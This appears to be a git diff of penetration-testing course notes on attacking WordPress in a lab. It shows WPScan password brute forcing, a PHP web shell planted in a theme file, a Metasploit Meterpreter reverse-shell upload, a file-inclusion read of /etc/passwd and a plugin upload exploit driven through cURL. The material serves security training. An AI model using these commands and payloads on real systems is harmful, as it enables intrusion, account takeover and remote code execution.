@@ -12,8 +12,7 @@ There are several ways we can abuse `built-in functionality` to attack a WordPre
 
 WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) and wp-login. The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it’s faster.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 
 [+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
@@ -51,8 +50,7 @@ With administrative access to WordPress, we can modify the PHP source code to ex
 
 Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.
 
-```
-        php
+```php
 system($_GET[0]);
 ```
 
@@ -64,8 +62,7 @@ http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twe
 
 Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`. We can interact with the web shell via the browser or using `cURL`. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -75,8 +72,7 @@ The [wp\_admin\_shell\_upload](https://www.rapid7.com/db/modules/exploit/unix/we
 
 The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.
 
-```
-        shellsession
+```shellsession
 msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
 
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
@@ -90,8 +86,7 @@ msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.l
 
 We can then issue the `show options` command to ensure that everything is set up properly. In this lab example, we must specify both the vhost and the IP address, or the exploit will fail with the error `Exploit aborted due to failure: not-found: The target does not appear to be using WordPress`.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 
 
 Module options (exploit/unix/webapp/wp_admin_shell_upload):
@@ -123,8 +118,7 @@ Exploit target:
 
 Once we are satisfied with the setup, we can type `exploit` and obtain a reverse shell. From here, we could start enumerating the host for sensitive data or paths for vertical/horizontal privilege escalation and lateral movement.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.15:4444 
@@ -171,8 +165,7 @@ Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plug
 
 Let's take a look at the vulnerable code for the mail-masta plugin.
 
-```
-        php
+```php
 <?php 
 
 include($_GET['pl']);
@@ -189,8 +182,7 @@ echo $count[0]->co;
 
 As we can see, the `pl` parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
@@ -236,8 +228,7 @@ mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
 
 The exploit script takes two parameters: `-u` the URL and `-p` the path to a valid post.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 
 ---------------------------------------------------------------
@@ -264,8 +255,7 @@ hiimeins@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /
 
 The exploit as written may fail, but we can use `cURL` to execute commands using the uploaded web shell. We just need to append `?cmd=` after the `.php` extension to run commands which we can see in the exploit script.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
 
 GIF689a;
